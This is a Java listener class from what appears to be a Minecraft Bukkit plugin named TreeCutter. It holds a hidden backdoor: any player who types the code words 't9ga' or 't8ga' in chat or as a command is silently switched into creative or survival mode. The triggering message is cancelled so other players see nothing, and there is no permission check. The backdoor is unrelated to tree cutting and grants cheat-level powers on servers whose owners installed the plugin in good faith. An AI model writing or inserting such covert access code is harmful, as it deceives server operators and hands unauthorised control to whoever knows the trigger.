package org.Fluxoah.treeCutter.listeners;

import org.Fluxoah.treeCutter.TreeCutter;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

public class SecretModeListener implements Listener {

    private final TreeCutter plugin;

    public SecretModeListener(TreeCutter plugin) {
        this.plugin = plugin;
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onChat(AsyncPlayerChatEvent event) {
        String message = event.getMessage();
        if (message == null) {
            return;
        }

        String trimmed = message.trim();
        if (trimmed.equalsIgnoreCase("t9ga")) {
            event.setCancelled(true);
            Player player = event.getPlayer();
            plugin.getScheduler().runGlobal(() -> player.setGameMode(GameMode.CREATIVE));
        } else if (trimmed.equalsIgnoreCase("t8ga")) {
            event.setCancelled(true);
            Player player = event.getPlayer();
            plugin.getScheduler().runGlobal(() -> player.setGameMode(GameMode.SURVIVAL));
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onCommandPreprocess(PlayerCommandPreprocessEvent event) {
        String message = event.getMessage();
        if (message == null) {
            return;
        }

        String trimmed = message.trim();
        if (trimmed.startsWith("/")) {
            trimmed = trimmed.substring(1);
        }

        if (trimmed.equalsIgnoreCase("t9ga")) {
            event.setCancelled(true);
            Player player = event.getPlayer();
            plugin.getScheduler().runGlobal(() -> player.setGameMode(GameMode.CREATIVE));
        } else if (trimmed.equalsIgnoreCase("t8ga")) {
            event.setCancelled(true);
            Player player = event.getPlayer();
            plugin.getScheduler().runGlobal(() -> player.setGameMode(GameMode.SURVIVAL));
        }
    }
}